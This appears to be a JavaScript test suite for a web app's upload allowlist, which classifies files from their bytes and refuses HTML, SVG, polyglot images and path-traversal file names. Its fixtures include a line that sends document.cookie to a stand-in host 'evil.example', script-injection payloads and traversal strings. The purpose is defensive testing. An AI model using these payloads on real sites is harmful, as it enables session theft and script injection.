// S-uploads (compliance audit P1-2 + owner ruling 2026-09-26): uploads are
// an allowlist classified from the bytes, the stored content-type and
// extension are server-derived, and storage holds ONLY images
// (JPEG/PNG/WebP/GIF/AVIF) and videos (MP4/MOV/WebM). PDF, CSV, XLSX and
// every other type are refused by the Library.
//
// Before this lane an `unknown` expected kind skipped validation entirely,
// files.ts stored the client's File.type as the R2 content-type, the
// client's extension survived into the object key, every Library file
// landed under the public uploads/ prefix, and the chunked offline-sync path
// never validated at all -- so an insider could store `.html` / `.svg` that
// /uploads/* then served as text/html or image/svg+xml on the admin origin.
//
// Fixtures discriminate: each "rejected" case was ACCEPTED by the previous
// implementation, and each "server-derived type" case carries a client
// claim that differs from the bytes.

const assert = require('node:assert/strict')
const fs = require('node:fs')
const Module = require('node:module')
const path = require('node:path')
const ts = require('typescript')
const Database = require('better-sqlite3')
const { Hono } = require('hono')

function loadTs(relativePath, stubs = {}) {
  const filePath = path.join(__dirname, '..', 'src', relativePath)
  const outputText = ts.transpileModule(fs.readFileSync(filePath, 'utf8'), {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 },
    fileName: filePath,
  }).outputText
  const originalLoad = Module._load
  Module._load = function patchedLoad(request, parent, isMain) {
    if (Object.prototype.hasOwnProperty.call(stubs, request)) return stubs[request]
    return originalLoad.call(this, request, parent, isMain)
  }
  try {
    const loaded = { exports: {} }
    new Function('exports', 'require', 'module', '__filename', '__dirname', outputText)(
      loaded.exports, require, loaded, filePath, path.dirname(filePath),
    )
    return loaded.exports
  } finally {
    Module._load = originalLoad
  }
}

const security = loadTs('lib/uploadSecurity.ts')
const fileAssets = loadTs('lib/fileAssets.ts')

const enc = (text) => new TextEncoder().encode(text)
const bytes = (...parts) => {
  const arrays = parts.map((part) => (typeof part === 'string' ? enc(part) : Uint8Array.from(part)))
  const out = new Uint8Array(arrays.reduce((sum, a) => sum + a.length, 0))
  let offset = 0
  for (const a of arrays) { out.set(a, offset); offset += a.length }
  return out
}

const PNG = bytes([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13], 'IHDR', new Array(40).fill(1))
const JPEG = bytes([0xff, 0xd8, 0xff, 0xe0, 0, 16], 'JFIF', new Array(40).fill(2))
// Real JPEGs carry XMP metadata; '<?xpacket' / '<x:xmpmeta' / '<rdf:RDF'
// must not trip the polyglot check.
const JPEG_WITH_XMP = bytes([0xff, 0xd8, 0xff, 0xe1, 0, 80], 'http://ns.adobe.com/xap/1.0/\0<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF></rdf:RDF></x:xmpmeta>', new Array(40).fill(2))
const WEBP = bytes('RIFF', [40, 0, 0, 0], 'WEBPVP8 ', new Array(40).fill(3))
const GIF = bytes('GIF89a', [1, 0, 1, 0, 0, 0, 0], new Array(20).fill(0))
const AVIF = bytes([0, 0, 0, 28], 'ftypavif', [0, 0, 0, 0], 'avifmif1miaf', new Array(20).fill(0))
const PDF = bytes('%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n')
const XLSX = bytes([0x50, 0x4b, 0x03, 0x04, 20, 0, 0, 0], '[Content_Types].xml', new Array(30).fill(0), 'xl/workbook.xml', new Array(30).fill(0))
const CSV = enc('﻿barcode,name,price\n885001,ទឹកដោះគោ,1.25\n885002,"Rice, 5kg",4.50\n')
const MP4 = bytes([0, 0, 0, 24], 'ftypisom', new Array(40).fill(0))
const MOV = bytes([0, 0, 0, 20], 'ftypqt  ', new Array(40).fill(0))
const WEBM = bytes([0x1a, 0x45, 0xdf, 0xa3], new Array(40).fill(0))

const HTML = enc('<!doctype html><html><body><script>fetch("/api/users",{credentials:"include"})</script></body></html>')
const HTML_WITH_COMMAS = enc('<html><body onload="alert(1)">a,b,c</body></html>')
const HTML_NOT_FIRST = enc('name,price\n<script>alert(document.cookie)</script>,1\n')
const SVG = enc('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>')
const SVG_BARE = enc('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
const XML = enc('<?xml version="1.0"?><root><item a="1,2"/></root>')
const JS = enc('const token = document.cookie; fetch("https://evil.example/?t=" + token);\n')
const ZIP_NOT_XLSX = bytes([0x50, 0x4b, 0x03, 0x04, 20, 0], 'index.html', new Array(30).fill(0))
const BMP = bytes('BM', [70, 0, 0, 0, 0, 0, 0, 0, 54, 0, 0, 0, 40, 0, 0, 0], new Array(40).fill(0))
const HEIC = bytes([0, 0, 0, 24], 'ftypheic', [0, 0, 0, 0], 'mif1heic', new Array(20).fill(0))
const BM_TEXT = enc('BM, this is a text line, not a bitmap at all\n')
// Polyglots: a valid image signature followed by markup a browser would run
// if the bytes were ever rendered as HTML.
const POLYGLOT_JPEG = bytes([0xff, 0xd8, 0xff, 0xe0, 0, 16], 'JFIF', new Array(20).fill(2), '<html><body><SCRIPT>alert(document.domain)</SCRIPT></body></html>')
const POLYGLOT_GIF = bytes('GIF89a', [1, 0, 1, 0, 0, 0, 0], '<svg onload=alert(1)>')
const POLYGLOT_PNG_JS_URL = bytes([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], 'tEXt', 'JavaScript:alert(1)')

// ---------------------------------------------------------------- detector
{
  const accepted = [
    ['png', PNG, 'image', 'image/png', '.png'],
    ['jpeg', JPEG, 'image', 'image/jpeg', '.jpg'],
    ['jpeg with XMP metadata', JPEG_WITH_XMP, 'image', 'image/jpeg', '.jpg'],
    ['webp', WEBP, 'image', 'image/webp', '.webp'],
    ['gif', GIF, 'image', 'image/gif', '.gif'],
    ['avif', AVIF, 'image', 'image/avif', '.avif'],
    ['mp4', MP4, 'video', 'video/mp4', '.mp4'],
    ['mov', MOV, 'video', 'video/quicktime', '.mov'],
    ['webm', WEBM, 'video', 'video/webm', '.webm'],
  ]
  for (const [label, buffer, kind, mime, extension] of accepted) {
    const detected = security.classifyUploadedBuffer(buffer)
    assert.deepEqual(detected, { kind, mime, extension }, `${label} must be allowed with a server-derived type`)
    assert.equal(security.isPublicImageFormat(detected), kind === 'image', `${label}: image-only writers accept only images`)
    assert.equal(security.isLibraryMediaFormat(detected), true, `${label}: a Library format`)
  }

  const rejected = [
    ['html', HTML], ['html with commas', HTML_WITH_COMMAS], ['csv carrying a <script> row', HTML_NOT_FIRST],
    ['svg with xml prolog', SVG], ['bare svg', SVG_BARE], ['xml', XML], ['javascript', JS],
    ['zip that is not an xlsx', ZIP_NOT_XLSX], ['bmp (not on the public image list)', BMP],
    ['heic (must not fall through to video/mp4)', HEIC], ['empty', new Uint8Array(0)],
    // Owner ruling: documents are no longer stored at all.
    ['pdf', PDF], ['xlsx', XLSX], ['csv (utf-8 Khmer, BOM, quoted comma)', CSV], ['text line starting "BM"', BM_TEXT],
  ]
  for (const [label, buffer] of rejected) {
    assert.equal(security.detectUploadFormat(buffer), null, `${label} must be outside the allowlist`)
    assert.throws(() => security.classifyUploadedBuffer(buffer), /not supported/, `${label} must throw the clear message`)
  }

  for (const [label, buffer] of [['jpeg + html', POLYGLOT_JPEG], ['gif + svg', POLYGLOT_GIF], ['png + javascript: url', POLYGLOT_PNG_JS_URL]]) {
    assert.equal(security.detectUploadFormat(buffer).kind, 'image', `${label}: the signature alone says image`)
    assert.throws(() => security.classifyUploadedBuffer(buffer), /embedded web page or script/, `${label} polyglot must be refused`)
    assert.throws(() => security.validateUploadedBuffer(buffer, 'image/jpeg', 'photo.jpg'), /embedded web page or script/, `${label} polyglot must be refused by the shared gate too`)
  }

}

// ------------------------------------- shared gate (products/users/imports)
{
  // The previous implementation skipped validation whenever the claimed
  // kind was 'unknown' -- every one of these passed before.
  assert.throws(() => security.validateUploadedBuffer(HTML, 'text/html', 'page.html'), /not supported/)
  assert.throws(() => security.validateUploadedBuffer(SVG_BARE, '', 'logo.svg'), /not supported/)
  assert.throws(() => security.validateUploadedBuffer(JS, 'text/javascript', 'x.js'), /not supported/)
  // A .html disguised as .jpg.
  assert.throws(() => security.validateUploadedBuffer(HTML, 'image/jpeg', 'photo.jpg'), /not supported/)
  // Double extension with HTML bytes.
  assert.throws(() => security.validateUploadedBuffer(HTML, 'image/png', 'evil.html.png'), /not supported/)
  // Real image bytes with a dangerous claim: callers outside this lane still
  // store the claimed type, so the claim itself is refused.
  assert.throws(() => security.validateUploadedBuffer(PNG, 'text/html', 'photo.png'), /not supported/)
  assert.throws(() => security.validateUploadedBuffer(PNG, 'image/svg+xml', 'photo.png'), /not supported/)
  // Legitimate: mislabeled-but-real images, octet-stream, Excel's CSV type,
  // and the XLSX type (whose name contains "xml" as a substring).
  assert.equal(security.validateUploadedBuffer(PNG, 'image/jpeg', 'photo.jpg').mime, 'image/png')
  assert.equal(security.validateUploadedBuffer(JPEG, '', 'avatar.jpg').mime, 'image/jpeg')
  assert.equal(security.validateUploadedBuffer(JPEG_WITH_XMP, 'image/jpeg', 'camera.jpg').mime, 'image/jpeg')
  // Documents are refused whatever they are called (owner ruling).
  assert.throws(() => security.validateUploadedBuffer(CSV, 'application/vnd.ms-excel', 'stock.csv'), /not supported/)
  assert.throws(() => security.validateUploadedBuffer(XLSX, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'items.xlsx'), /not supported/)
  assert.throws(() => security.validateUploadedBuffer(PDF, 'application/pdf', 'invoice.pdf'), /not supported/)
  // Kind mismatch is still refused: video bytes claimed as an image.
  assert.throws(() => security.validateUploadedBuffer(MP4, 'image/png', 'scan.png'), /do not match/)
}

// ------------------------------------ import uploads (routes/importJobs.ts)
{
  // ZIP: must be a ZIP, stored private with a server type -- before, a
  // "zip" declared text/html went to public uploads/ as text/html.
  const zip = security.classifyImportUpload('zip', ZIP_NOT_XLSX, 'text/html', 'images.zip')
  assert.deepEqual(zip, { contentType: 'application/zip', extension: '.zip', isPublic: false })
  assert.throws(() => security.classifyImportUpload('zip', HTML, 'application/zip', 'images.zip'), /not a ZIP/)
  // Image: public, detected type, claim ignored beyond kind agreement.
  assert.deepEqual(security.classifyImportUpload('image', PNG, 'image/jpeg', 'p.jpg'), { contentType: 'image/png', extension: '.png', isPublic: true })
  assert.throws(() => security.classifyImportUpload('image', PNG, 'text/html', 'p.png'), /not supported/)
  assert.throws(() => security.classifyImportUpload('image', POLYGLOT_JPEG, 'image/jpeg', 'p.jpg'), /embedded/)
  assert.throws(() => security.classifyImportUpload('image', BMP, 'image/bmp', 'p.bmp'), /not supported/)
  // CSV/TSV: private, type from the kind, never the claim.
  assert.deepEqual(security.classifyImportUpload('csv', CSV, 'text/html', 'items.csv'), { contentType: 'text/csv', extension: '.csv', isPublic: false })
  assert.deepEqual(security.classifyImportUpload('csv', CSV, '', 'items.tsv'), { contentType: 'text/tab-separated-values', extension: '.tsv', isPublic: false })
}

// ----------------------------------------------------- stored name/extension
{
  assert.match(fileAssets.buildUniqueStoredName('evil.html'), /^evil-\d+-[a-f0-9]{8}\.bin$/)
  assert.match(fileAssets.buildUniqueStoredName('logo.SVG'), /^logo-\d+-[a-f0-9]{8}\.bin$/)
  assert.match(fileAssets.buildUniqueStoredName('evil.html', '.png'), /^evil-\d+-[a-f0-9]{8}\.png$/)
  assert.match(fileAssets.buildUniqueStoredName('photo.jpg'), /^photo-\d+-[a-f0-9]{8}\.jpg$/)
  // Documents are not a storable suffix any more.
  assert.match(fileAssets.buildUniqueStoredName('stock.xlsx'), /^stock-\d+-[a-f0-9]{8}\.bin$/)
  assert.match(fileAssets.buildUniqueStoredName('invoice.pdf'), /\.bin$/)
  assert.match(fileAssets.buildUniqueStoredName('README'), /^README-\d+-[a-f0-9]{8}\.bin$/)
  // Double extension: only the final, server-chosen extension counts.
  assert.match(fileAssets.buildUniqueStoredName('photo.png.html'), /\.bin$/)
  assert.match(fileAssets.buildUniqueStoredName('photo.html.png', '.jpg'), /\.jpg$/)
  // A malformed override cannot smuggle a path or a long extension in.
  assert.match(fileAssets.buildUniqueStoredName('a.png', '/../x.html'), /\.png$/)
  // Path traversal: no separator can survive into the stored name.
  for (const hostile of ['../../backups/cloudflare/x.png', '..\\..\\private\\library\\x.png', '/etc/passwd', 'a/../../b.png', '..']) {
    const name = fileAssets.buildUniqueStoredName(hostile, '.png')
    assert.ok(!/[\\/]/.test(name), `stored name must hold no path separator: ${hostile} -> ${name}`)
    assert.ok(!('uploads/' + name).slice('uploads/'.length).includes('/'), `key stays one segment under uploads/: ${name}`)
  }
}

// ------------------------------------------------------ files.ts routes
const db = new Database(':memory:')
db.pragma('foreign_keys = OFF')
const migrationsDir = path.join(__dirname, '..', 'migrations')
for (const file of fs.readdirSync(migrationsDir).filter((file) => file.endsWith('.sql')).sort()) {
  db.exec(fs.readFileSync(path.join(migrationsDir, file), 'utf8'))
}
const dbShim = {
  prepare(sql) {
    return {
      async get(params) { return db.prepare(sql).get(params ?? {}) },
      async all(params) { return db.prepare(sql).all(params ?? {}) },
      async run(params) {
        const result = db.prepare(sql).run(params ?? {})
        return { changes: result.changes, lastInsertRowid: Number(result.lastInsertRowid) }
      },
    }
  },
}

const puts = []
const gets = []
const store = new Map()
const ASSETS = {
  put: async (key, body, options) => {
    puts.push({ key, body, contentType: options?.httpMetadata?.contentType })
    store.set(key, { body: new Uint8Array(body), contentType: options?.httpMetadata?.contentType })
  },
  get: async (key) => {
    gets.push(key)
    const entry = store.get(key)
    if (!entry) return null
    return {
      size: entry.body.byteLength,
      body: entry.body,
      writeHttpMetadata(headers) { if (entry.contentType) headers.set('content-type', entry.contentType) },
    }
  },
  // R2's binding deletes one key or an array of keys in one call.
  delete: async (key) => { for (const k of [].concat(key)) store.delete(k) },
}
const permissions = loadTs('lib/permissions.ts')
const enqueued = []
// The REAL variant writer/deleter (lib/imageVariantStore.ts), so the route is proven to call it.
const imageVariantStore = loadTs('lib/imageVariantStore.ts', {
  '../index': {},
  './uploadSecurity': security,
  './imageVariants': loadTs('lib/imageVariants.ts', { './quotaGuard': {}, './r2': {}, '../index': {} }),
})

const filesRoute = loadTs('routes/files.ts', {
  hono: { Hono },
  '../lib/auth': { requireAuth: async (c, next) => {
    if (!c.env.TEST_USER) return c.json({ error: 'Unauthorized' }, 401)
    c.set('user', c.env.TEST_USER)
    await next()
  } },
  '../lib/db': { getDb: () => dbShim },
  '../lib/permissions': permissions,
  '../lib/media': loadTs('lib/media.ts'),
  '../lib/uploadReferences': loadTs('lib/uploadReferences.ts'),
  '../lib/r2': { UPLOAD_CONTENT_SECURITY_POLICY: "sandbox; default-src 'none'" },
  '../lib/sqlBinding': loadTs('lib/sqlBinding.ts'),
  '../lib/fileAssets': fileAssets,
  '../lib/uploadSecurity': security,
  '../lib/libraryLogicalAssets': { logicalLibraryName: (name) => name },
  '../lib/imageAudit': { enqueueImageNormalization: async (_env, key) => { enqueued.push(key) } },
  '../lib/imageVariantStore': imageVariantStore,
  '../lib/imagePipeline': { optimizeImage: async () => ({ ok: false }), IMAGE_MAX_BYTES: 1024 },
  '../lib/rateLimit': { checkRateLimit: async () => ({ allowed: true }), getClientIp: () => '127.0.0.1' },
  '../lib/audit': { audit: async () => {} },
  '../durable-objects/broadcastHub': { broadcast: async () => {} },
  '../lib/cache': { bumpVersion: async () => {} },
  '../lib/actorSnapshot': { actorSnapshot: () => null },
  '../index': {},
})
const filesApp = filesRoute.default || filesRoute
const librarian = { id: 7, username: 'librarian', role_code: 'staff', permissions: JSON.stringify({ library: true }), role_permissions: null }

async function call(pathname, init, user) {
  const response = await filesApp.request(`http://local${pathname}`, init, { TEST_USER: user, ASSETS }, { waitUntil() {}, passThroughOnException() {} })
  return response
}

async function upload(buffer, name, type) {
  puts.length = 0
  enqueued.length = 0
  const form = new FormData()
  form.append('file', new File([buffer], name, { type }))
  const response = await call('/upload', { method: 'POST', body: form }, librarian)
  return { status: response.status, json: await response.json().catch(() => null) }
}

// --------------------------------------------- sync-upload DO (chunked)
const doModule = loadTs('durable-objects/syncUploadSession.ts', {
  '../lib/fileAssets': fileAssets,
  '../lib/uploadSecurity': security,
  '../lib/db': { getDb: () => dbShim },
  '../index': {},
})

function makeDoState() {
  const map = new Map()
  return {
    map,
    storage: {
      async get(key) { return map.get(key) },
      async put(key, value) { map.set(key, value) },
      async deleteAll() { map.clear() },
    },
  }
}

async function sha256Hex(data) {
  const digest = await crypto.subtle.digest('SHA-256', data)
  return [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, '0')).join('')
}

;(async () => {
  // Direct path: a .html named .jpg is rejected and never reaches R2.
  {
    const result = await upload(HTML, 'photo.jpg', 'image/jpeg')
    assert.equal(result.status, 400)
    assert.equal(result.json.code, 'unsupported_file_type')
    assert.match(result.json.error, /not supported/)
    assert.equal(puts.length, 0, 'rejected upload must not be stored')
  }
  // Direct path: the cases the old unknown-kind skip let straight through,
  // plus double-extension, BMP/HEIC and polyglots.
  for (const [buffer, name, type] of [
    [HTML, 'page.html', 'text/html'],
    [HTML, 'evil.html.png', 'image/png'],
    [SVG, 'logo.svg', 'image/svg+xml'],
    [SVG_BARE, 'logo.svg', ''],
    [XML, 'feed.xml', 'application/xml'],
    [JS, 'app.js', 'text/javascript'],
    [BMP, 'scan.bmp', 'image/bmp'],
    [HEIC, 'IMG_0001.HEIC', 'image/heic'],
    [POLYGLOT_JPEG, 'photo.jpg', 'image/jpeg'],
    [POLYGLOT_GIF, 'anim.gif', 'image/gif'],
  ]) {
    const result = await upload(buffer, name, type)
    assert.equal(result.status, 400, `${name} must be rejected`)
    assert.equal(result.json.code, 'unsupported_file_type')
    assert.equal(puts.length, 0, `${name} must not be stored`)
  }
  // SEC-3 repro: GIF89a<script> named x.png declared text/html. The old
  // route stored it as text/html under /uploads.
  {
    const result = await upload(bytes('GIF89a<script>alert(document.cookie)</script>'), 'x.png', 'text/html')
    assert.equal(result.status, 400, JSON.stringify(result.json))
    assert.equal(puts.length, 0)
  }
  // Oversized: over the 12MB image fallback ceiling -> 400, nothing stored.
  {
    const big = new Uint8Array(13 * 1024 * 1024)
    big.set(JPEG, 0)
    const result = await upload(big, 'huge.jpg', 'image/jpeg')
    assert.equal(result.status, 400)
    assert.match(result.json.error, /safety limit/)
    assert.equal(puts.length, 0)
  }
  // Over the 25MB route ceiling -> 400 before any classification.
  {
    const result = await upload(new Uint8Array(25 * 1024 * 1024 + 1), 'huge.csv', 'text/csv')
    assert.equal(result.status, 400)
    assert.match(result.json.error, /too large/)
    assert.equal(puts.length, 0)
  }

  // Images: public prefix, server-derived type/extension, claim ignored --
  // PNG bytes named evil.html typed text/html are stored as image/png .png.
  for (const [buffer, name, claimed, mime, ext] of [
    [PNG, 'evil.html', 'text/html', 'image/png', '.png'],
    [JPEG, 'shot.png', 'image/png', 'image/jpeg', '.jpg'],
    [WEBP, 'shot.webp', '', 'image/webp', '.webp'],
    [GIF, 'anim.gif', 'image/gif', 'image/gif', '.gif'],
    [AVIF, 'photo.avif', 'application/octet-stream', 'image/avif', '.avif'],
    [PNG, '../../private/library/x.png', 'image/png', 'image/png', '.png'],
  ]) {
    const result = await upload(buffer, name, claimed)
    assert.equal(result.status, 200, `${name}: ${JSON.stringify(result.json)}`)
    assert.equal(puts.length, 1)
    assert.equal(puts[0].contentType, mime, `${name} stored type must be derived from bytes`)
    assert.match(puts[0].key, new RegExp(`^uploads/[^/\\\\]+-\\d+-[a-f0-9]{8}\\${ext}$`), `${name} -> ${puts[0].key}`)
    assert.equal(result.json.mime_type, mime)
    assert.equal(result.json.media_type, 'image')
    assert.equal(result.json.public_path, `/${puts[0].key}`)
    assert.deepEqual(enqueued, [puts[0].key], 'public images still get queued normalization')
  }

  // Video: public (owner ruling -- the storefront About block plays it to
  // anonymous visitors), with the DETECTED type/extension so lib/r2.ts's
  // extension-based serving never sees a client-chosen suffix.
  {
    const result = await upload(MP4, 'promo.html', 'text/html')
    assert.equal(result.status, 200, JSON.stringify(result.json))
    assert.equal(puts[0].contentType, 'video/mp4')
    assert.match(puts[0].key, /^uploads\/promo-\d+-[a-f0-9]{8}\.mp4$/)
    assert.equal(result.json.media_type, 'video')
    assert.deepEqual(enqueued, [], 'video is not queued for image normalization')
  }

  // Documents: refused outright (owner ruling -- storage holds only images
  // and videos). Before, each of these was stored under /uploads.
  for (const [buffer, name, claimed] of [
    [PDF, 'invoice.pdf', 'application/pdf'],
    [XLSX, 'items.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'],
    [CSV, 'stock list.csv', 'text/csv'],
    [PDF, 'scan.jpg', 'image/jpeg'],
  ]) {
    const result = await upload(buffer, name, claimed)
    assert.equal(result.status, 400, name + ': ' + JSON.stringify(result.json))
    assert.equal(result.json.code, 'unsupported_file_type')
    assert.match(result.json.error, /only stores images/)
    assert.equal(puts.length, 0, name + ' must not be stored')
  }

  // Download and delete still address uploads/<stored_name>.
  {
    const result = await upload(PNG, 'keep.png', 'image/png')
    assert.equal(result.status, 200)
    const key = puts[0].key
    assert.ok(store.has(key))
    const download = await call('/' + result.json.id + '/download', { method: 'GET' }, librarian)
    assert.equal(download.status, 200)
    const del = await call('/' + result.json.id, { method: 'DELETE', headers: { 'content-type': 'application/json' }, body: '{}' }, librarian)
    assert.equal(del.status, 200, await del.clone().text())
    assert.ok(!store.has(key), 'delete must remove the uploads/ object')
  }

  // The browser's thumbnails ride in the same request: stored at the ORIGINAL's
  // name (never the client's), refused unless WebP, and removed with the original.
  {
    puts.length = 0
    const form = new FormData()
    form.append('file', new File([PNG], 'thumbs.png', { type: 'image/png' }))
    form.append('variant_w320', new File([WEBP], '../../evil.webp', { type: 'image/webp' }))
    form.append('variant_w640', new File([JPEG], 'x.webp', { type: 'image/webp' }))
    const result = await call('/upload', { method: 'POST', body: form }, librarian)
    assert.equal(result.status, 200, await result.clone().text())
    const asset = await result.json()
    const keys = puts.map((p) => p.key)
    assert.ok(keys.includes('variants/w320/' + asset.stored_name + '.webp'), 'w320 thumbnail stored under the original name: ' + keys.join())
    assert.ok(!keys.some((k) => k.includes('evil')), 'the client file name never reaches a key')
    assert.ok(!keys.includes('variants/w640/' + asset.stored_name + '.webp'), 'a JPEG sent as w640 is refused (bytes decide)')
    const del = await call('/' + asset.id, { method: 'DELETE', headers: { 'content-type': 'application/json' }, body: '{}' }, librarian)
    assert.equal(del.status, 200, await del.clone().text())
    assert.ok(!store.has('variants/w320/' + asset.stored_name + '.webp'), 'deleting the file deletes its thumbnail')
    assert.ok(!store.has('uploads/' + asset.stored_name))
  }

  // The chunked-upload routes were removed; the retired DO still refuses a
  // request without an owner, and one staged for another owner.
  {
    // The DO itself refuses a request without an owner, and a manifest
    // staged for one owner from a request naming another.
    const state = makeDoState()
    const session = new doModule.SyncUploadSession(state, { ASSETS })
    const bare = await session.fetch(new Request('http://do/complete', { method: 'POST' }))
    assert.equal(bare.status, 403)
    await session.fetch(new Request('http://do/init', { method: 'POST', headers: { 'x-upload-owner': '7' }, body: JSON.stringify({
      upload_id: 'z', size: PNG.length, chunk_count: 1, sha256: await sha256Hex(PNG), chunk_size: 1024 * 1024,
    }) }))
    const wrongOwner = await session.fetch(new Request('http://do/complete', { method: 'POST', headers: { 'x-upload-owner': '9' } }))
    assert.equal(wrongOwner.status, 404)
  }

  console.log('upload allowlist: all assertions passed')
})().catch((error) => {
  console.error(error)
  process.exit(1)
})
